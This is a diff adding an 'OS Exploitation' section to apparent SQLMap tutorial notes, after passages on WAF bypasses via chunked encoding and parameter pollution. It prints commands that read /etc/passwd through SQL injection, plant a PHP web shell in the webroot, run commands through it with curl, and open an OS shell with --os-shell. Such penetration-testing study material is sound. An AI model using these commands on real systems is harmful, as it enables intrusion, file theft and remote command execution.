@@ -407,3 +407,47 @@ To get a whole list of implemented tamper scripts, along with the description, s
 ### Miscellaneous Bypasses
 The Chunked transfer encoding is turned on using the switch `--chunked`, which splits the POST request's body into so-called "chunks." Blocklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.
 The other bypass mechanisms is the HTTP parameter pollution (HPP), where payloads are split in a similar way as in case of `--chunked` between different same parameter named values (e.g. ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...), which are concatenated by the target platform if supporting it (e.g. ASP - Microsoft server-side web framework used to create dynamic web pages).
+
+## OS Exploitation
+SQLMap has the ability to utilize an SQL Injection to read and write files from the local system outside the DBMS. SQLMap can also attempt to give us direct command execution on the remote host if we had the proper privileges.
+
+### Checking for DBA Privileges
+To check whether we have DBA privileges with SQLMap, we can use the --is-dba option:
+```
+sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+```
+Instead of manually injecting the above line through SQLi, SQLMap makes it relatively easy to read local files with the --file-read option:
+```
+sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+```
+Then we can `cat` the saved file.
+
+### Writing Local Files
+```
+sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+```
+If it is a php web-shell, we can execute command with:
+```
+curl http://www.example.com/shell.php?cmd=ls+-la
+```
+If we didn't know the server webroot, we will see how SQLMap can automatically find it:
+```
+sqlmap -u "http://example.com/page.php?id=1" \
+  --file-write shell.php \
+  --file-dest "/tmp/shell.php" \
+  --web-root
+```
+The --web-root flag (experimental) or simply running without a known path lets SQLMap:
+- Write to multiple locations
+- Try to access the file over HTTP
+- Report where the file becomes reachable
+
+### OS Command Execution
+SQLMap utilizes various techniques to get a remote shell through SQL injection vulnerabilities, like writing a remote shell, as we just did, writing SQL functions that execute commands and retrieve output or even using some SQL queries that directly execute OS command, like xp_cmdshell in Microsoft SQL Server. To get an OS shell with SQLMap, we can use the `--os-shell` option, as follows:
+```
+sqlmap -u "http://www.example.com/?id=1" --os-shell
+```
+SQLMap defaulted to UNION technique to get an OS shell. We can try to specify another technique, like the Error-based SQL Injection, which we can specify with `--technique=E`:
+```
+sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
+```
